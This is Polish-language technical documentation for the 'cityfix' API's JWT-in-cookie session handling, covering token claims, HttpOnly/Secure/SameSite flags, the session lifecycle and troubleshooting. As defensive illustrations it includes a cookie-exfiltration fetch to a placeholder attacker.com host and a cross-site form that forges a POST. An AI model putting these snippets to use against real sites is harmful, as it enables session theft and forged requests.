# Sesje i Autentykacja - Dokumentacja Techniczna

## Spis Treści
1. [Typy Sesji](#typy-sesji)
2. [Nasze Podejście: Stateless Sessions](#nasze-podejście-stateless-sessions)
3. [Bezpieczeństwo Sesji](#bezpieczeństwo-sesji)
4. [Lifecycle Sesji](#lifecycle-sesji)
5. [Monitoring Sesji](#monitoring-sesji)
6. [Troubleshooting](#troubleshooting)

---

## Typy Sesji

### 1. Tradycyjne Sesje (Stateful)

**Jak Działa:**
```
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │
       │ POST /login (username, password)
       ├──────────────────────────>
       │
       │ SET-COOKIE: PHPSESSID=abc123
       │<──────────────────────────
       │
       ├─────────────────────────────────┐
       │ Serwer zapisuje sesję w tabeli: │
       │ id: abc123                      │
       │ user_id: 1                      │
       │ expires: 2024-01-14             │
       └─────────────────────────────────┘
```

**Problemy:**
- ❌ Wymaga tabeli sesji w BD
- ❌ Skalowanie poziome - problemy z synchronizacją
- ❌ Zapytania do BD dla każdego żądania
- ⚠️ Może być odwołana natychmiast
- ⚠️ CSRF podatności

### 2. JWT Stateless Sessions (Nasze Podejście)

**Jak Działa:**
```
┌─────────────┐
│   Browser   │
└──────┬──────┘
       │
       │ POST /login (username, password)
       ├──────────────────────────>
       │
       │ SET-COOKIE: JWT_TOKEN=eyJhbGciOi...
       │<──────────────────────────
       │
       │ ┌──────────────────────────────────┐
       │ │ JWT zawiera wszystkie dane:      │
       │ │ {                                │
       │ │   sub: "johndoe",                │
       │ │   userId: 1,                     │
       │ │   iat: 1673612000,               │
       │ │   exp: 1673698400                │
       │ │ }                                │
       │ │ Podpisany i nie można zmienić!  │
       │ └──────────────────────────────────┘
```

**Zalety:**
- ✅ Brak tabeli sesji
- ✅ Skalowanie poziome - każdy serwer może walidować
- ✅ Szybsze - bez queryowania BD
- ✅ Niezmienialny - nie można sfałszować
- ✅ CSRF ochrona (SameSite)

**Wady:**
- ⚠️ Nie można odwołać natychmiast
- ⚠️ Zmiana uprawnień - opóźnienie
- ⚠️ Token zawiera dane użytkownika

---

## Nasze Podejście: Stateless Sessions

### JWT Token Struktura

**Header:**
```json
{
  "alg": "HS512",
  "typ": "JWT"
}
```

**Payload (Claims):**
```json
{
  "sub": "johndoe",           // Subject (Username)
  "userId": 1,                // User ID (dodane przez nas)
  "iat": 1673612000,          // Issued At
  "exp": 1673698400,          // Expiration (24h pozniej)
  "iss": "cityfix-api",       // Issuer
  "aud": "cityfix-users"      // Audience
}
```

**Signature:**
```
HMACSHA512(base64(header) + "." + base64(payload), SECRET_KEY)
```

### Brak Tabeli Sesji

**Tradycyjnie** (co my NIE robimy):

```sql
CREATE TABLE sessions (
  id VARCHAR(32) PRIMARY KEY,
  user_id INTEGER NOT NULL,
  username VARCHAR(50),
  data TEXT,
  last_activity TIMESTAMP,
  expires_at TIMESTAMP,
  CONSTRAINT fk_sessions_user FOREIGN KEY (user_id) REFERENCES users(id)
);
```

**My - JWT w Cookies** (co robimy):

```sql
-- BRAK TABELI SESJI!
-- Sesja jest całkowicie w JWT tokenie
-- Przechowywana w cookies użytkownika
-- Żadna tabela do synchronizacji
```

### Zawartość Sesji vs JWT

| Cecha | Tradycyjna Sesja | JWT (My) |
|-------|------------------|----------|
| **Gdzie przechowywana** | Baza danych | Cookies (Browser) |
| **Dane** | User ID, data, status | Claims (sub, userId, iat, exp) |
| **Walidacja** | Query BD | Sprawdzenie sygnatury |
| **Revocation** | DELETE z tabeli | Niemożliwe (do expiration) |
| **Rozmiar** | Mały (indeks) | ~500 bytes |
| **Skalowanie** | Problematyczne | Łatwe |

---

## Bezpieczeństwo Sesji

### 1. JWT Signing (Cryptographic Signing)

```
┌─────────────────────────────────────────┐
│ Payload (nieszyfowany - tylko base64)    │
│ {                                        │
│   "sub": "johndoe",                     │
│   "userId": 1,                          │
│   "iat": 1673612000,                    │
│   "exp": 1673698400                     │
│ }                                        │
└────────────┬────────────────────────────┘
             │
             ▼
         ┌─────────────────────────────┐
         │ HMACSHA512(payload, SECRET) │
         │ Tylko serwer zna SECRET!    │
         └────────────┬────────────────┘
                      │
                      ▼
            ┌──────────────────────┐
            │ Sygnatury: abc123def │
            └──────────────────────┘
             
Token = base64(header) + "." + base64(payload) + "." + signature
```

**Atakujący chce zmienić payload:**

```
Original: { "userId": 1 }
Attacker Tries: { "userId": 999 }

Ale sygnatury:
- Original: HMACSHA512(original, SECRET)
- Modified: HMACSHA512(modified, SECRET)
- NIE SĄ RÓWNE!

Server odrzuci token - sygnatury nie pasują!
```

### 2. HttpOnly Cookie (XSS Protection)

```javascript
// Atakujący JS kod:

// ❌ Nie może ukraść z cookies!
console.log(document.cookie); // Pusty!

// ❌ Nie może wysłać na serwer atakującego
fetch('https://attacker.com', {
  body: document.cookie // Pusty!
});

// ✅ Cookie jest wysyłana automatycznie tylko do api.cityfix.com
fetch('https://api.cityfix.com/users/1'); // Cookie jest wysyłana!
```

### 3. Secure Flag (HTTPS Only)

```
Set-Cookie: JWT_TOKEN=...; Secure
```

- ❌ Cookie **nie jest** wysyłana przez HTTP
- ✅ Cookie **jest** wysyłana przez HTTPS
- Ochrona przed man-in-the-middle atakami

### 4. SameSite=Strict (CSRF Protection)

```html
<!-- Atakujący webs: attacker.com -->
<form action="https://api.cityfix.com/users/1" method="POST">
  <input type="hidden" name="phone" value="+48999">
  <input type="submit">
</form>
```

**Bez SameSite:** Cookie wysyłana - CSRF atak!

```
POST /users/1 HTTP/1.1
Host: api.cityfix.com
Origin: https://attacker.com
Cookie: JWT_TOKEN=... ← Wysyłana! Atak!
```

**Z SameSite=Strict:** Cookie **nie** wysyłana - ochrona!

```
POST /users/1 HTTP/1.1
Host: api.cityfix.com
Origin: https://attacker.com
Cookie: (brak!) ← Nie wysyłana! Ochrona!
```

### 5. Path=/ (Scope)

```
Set-Cookie: JWT_TOKEN=...; Path=/
```

- Cookie dostępna na wszystkich ścieżkach (`/`, `/users`, `/api`, etc.)
- Jeśli byłoby `Path=/api`, to byłaby dostępna tylko dla `/api/*`

### 6. Max-Age=86400 (Expiration)

```
Set-Cookie: JWT_TOKEN=...; Max-Age=86400
```

- Cookie wygaśnie za 86400 sekund (24 godziny)
- Browser automatycznie usunie cookie
- Server będzie odrzucać tokeny ze starym `exp` claim

---

## Lifecycle Sesji

### 1. Rejestracja (Brak Sesji)

```
┌─────────────┐
│   Frontend  │
└──────┬──────┘
       │ POST /users/register
       │ { username, email, password }
       ▼
┌──────────────────┐
│  UserController  │ ✓ Użytkownik utworzony
│  .register()     │ ✗ Brak sesji!
└──────────────────┘
       │
       ▼
┌───────────────────┐
│ 201 Created       │
│ { id, username }  │
│ (Bez sesji)       │
└───────────────────┘

Użytkownik musi się zalogować!
```

### 2. Logowanie (Sesja Tworzona)

```
┌─────────────┐
│   Frontend  │
└──────┬──────┘
       │ POST /users/login
       │ { username, password }
       ▼
┌──────────────────┐
│  UserController  │
│  .login()        │
│  .setJwtCookie() │
└──────┬───────────┘
       │
       ├─ Weryfikacja hasła ✓
       ├─ JWT.generate() ✓
       ├─ Cookie.setHttpOnly() ✓
       ├─ Cookie.setSecure() ✓
       ├─ Cookie.setMaxAge(86400) ✓
       │
       ▼
┌─────────────────────────────────────┐
│ 200 OK                              │
│ Set-Cookie: JWT_TOKEN=...;          │
│   HttpOnly; Secure; SameSite=Strict │
│   Path=/; Max-Age=86400             │
│                                     │
│ { id, username, email }             │
│ (Bez tokenu w body!)                │
└─────────────────────────────────────┘
       │
       ▼
┌─────────────────────────┐
│ Browser                 │
│ Przechowuje cookie      │
│ Sesja: ACTIVE           │
└─────────────────────────┘
```

**Sesja Payload:**
```json
{
  "sub": "johndoe",
  "userId": 1,
  "iat": 1673612000,
  "exp": 1673698400,    ← Za 24h
  "iss": "cityfix-api",
  "aud": "cityfix-users"
}
```

### 3. Żądanie Autentykowane (Sesja Walidowana)

```
┌─────────────┐
│   Frontend  │
└──────┬──────┘
       │ GET /users/1
       │ (Cookie wysyłana automatycznie!)
       │
       ▼
┌──────────────────────────────┐
│ HTTP Request                 │
│ GET /users/1                 │
│ Cookie: JWT_TOKEN=eyJ...     │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│ JwtAuthenticationFilter      │
│ 1. Wyodrębnia JWT z cookies  │
│ 2. JWT.validate()            │
│    - Sprawdza sygnaturę      │
│    - Sprawdza expiration     │
│ 3. Ustawia SecurityContext   │
└──────────────┬───────────────┘
               │
      ✓ Token Ważny?
               │
               ▼
┌──────────────────────┐
│ UserController       │
│ .getUser(1)          │
│ ✓ Zalogowany!        │
└──────────────┬───────┘
               │
               ▼
┌──────────────────────┐
│ 200 OK               │
│ { user data }        │
└──────────────────────┘

Session: STILL ACTIVE (nie przedłużona!)
```

### 4. Wylogowanie (Sesja Zniszczona)

```
┌─────────────┐
│   Frontend  │
└──────┬──────┘
       │ POST /users/logout
       │ (Cookie wysyłana automatycznie!)
       ▼
┌──────────────────────┐
│ UserController       │
│ .logout()            │
│ .removeCookie()      │
└──────┬───────────────┘
       │
       ├─ Cookie.setMaxAge(0) ← Natychmiastowe usunięcie
       │
       ▼
┌──────────────────────────────────┐
│ 200 OK                           │
│ Set-Cookie: JWT_TOKEN=;          │
│   HttpOnly; Secure; SameSite=... │
│   Path=/; Max-Age=0              │
│                                  │
│ { message: "Logged out" }        │
└──────────────────────────────────┘
       │
       ▼
┌─────────────────────┐
│ Browser             │
│ Usuwa cookie        │
│ Sesja: DESTROYED    │
└─────────────────────┘
```

### 5. Po Expiration (Sesja Wygasła)

```
┌─────────────┐
│   Frontend  │
│ 24h później │
└──────┬──────┘
       │ GET /users/1
       │ (Cookie wciąż wysyłana!)
       ▼
┌──────────────────────────────┐
│ JwtAuthenticationFilter      │
│ 1. Wyodrębnia JWT            │
│ 2. Sprawdza exp: 1673698400  │
│    vs current: 1673784800    │
│    WYGASŁ!                   │
└──────────────┬───────────────┘
               │
      ✗ Token Wygasł!
               │
               ▼
┌──────────────────────────────┐
│ 401 Unauthorized             │
│ { message: "Token expired" } │
└──────────────────────────────┘
       │
       ▼
┌──────────────────────┐
│ Frontend             │
│ Redirect: /login     │
│ User musi się znowu  │
│ zalogować!           │
└──────────────────────┘
```

---

## Monitoring Sesji

### Sprawdzenie Cookie w Browser DevTools

```
F12 → Application → Cookies → localhost:8081

Name: JWT_TOKEN
Value: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJqb2huZG9lIiwi...
Domain: localhost
Path: /
Expires: [Koniec dnia]
HttpOnly: ✓
Secure: ✗ (localhost nie ma HTTPS)
SameSite: Strict
```

### JWT Decode (https://jwt.io)

```
Header:
{
  "alg": "HS512",
  "typ": "JWT"
}

Payload:
{
  "sub": "johndoe",
  "userId": 1,
  "iat": 1673612000,
  "exp": 1673698400,
  "iss": "cityfix-api",
  "aud": "cityfix-users"
}

Signature:
[Zmiana payloadu = Signature Mismatch!]
```

### Logi Serwera

```
[DEBUG] JwtAuthenticationFilter: JWT token extracted from cookie: JWT_TOKEN
[DEBUG] JwtAuthenticationFilter: JWT token validated for user: johndoe
[INFO] UserController: Getting user with id: 1
[DEBUG] UserService: Fetching user with id: 1
```

---

## Troubleshooting

### Cookie Nie Jest Wysyłana

**Problem:** Frontend wysyła żądanie, ale cookie nie jest wysyłana

**Rozwiązanie 1: credentials: 'include'**
```javascript
// ❌ Błąd
fetch('/api/users/1');

// ✅ Poprawnie
fetch('/api/users/1', {
  credentials: 'include'
});
```

**Rozwiązanie 2: CORS Headers**
```yaml
# Server musi mieć:
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://frontend.com (nie *)
```

### Token Wygasł

**Symptom:** 401 Unauthorized

**Rozwiązanie:**
```javascript
// Catch 401 i redirect do logowania
fetch('/api/users/1')
  .then(r => {
    if (r.status === 401) {
      window.location.href = '/login';
    }
    return r.json();
  });
```

### Cookie Nie Jest HttpOnly

**Problem:** JavaScript może odczytać cookie

**Przyczyna:** Flaga HttpOnly nie ustawiona

**Fix:**
```java
cookie.setHttpOnly(true); // MUSI być true!
```

### CSRF Atak

**Problem:** POST żądanie z innej domeny działa

**Fix:**
```java
cookie.setAttribute("SameSite", "Strict");
```

### Produkcja: Cookie Nie Jest Wysyłana

**Problem:** Secure flag wymaga HTTPS

**Rozwiązanie:**
- Utwórz SSL certificate
- Włącz HTTPS
- Cookie będzie wysyłana w produkcji

---

## Checklist Bezpieczeństwa

- [ ] Secret key 256-bit
- [ ] HttpOnly=true
- [ ] Secure=true (produkcja)
- [ ] SameSite=Strict
- [ ] Path=/
- [ ] Max-Age ustawiony
- [ ] HTTPS w produkcji
- [ ] CORS Allow-Credentials
- [ ] Testowanie logowania/wylogowania
- [ ] Monitorowanie sesji

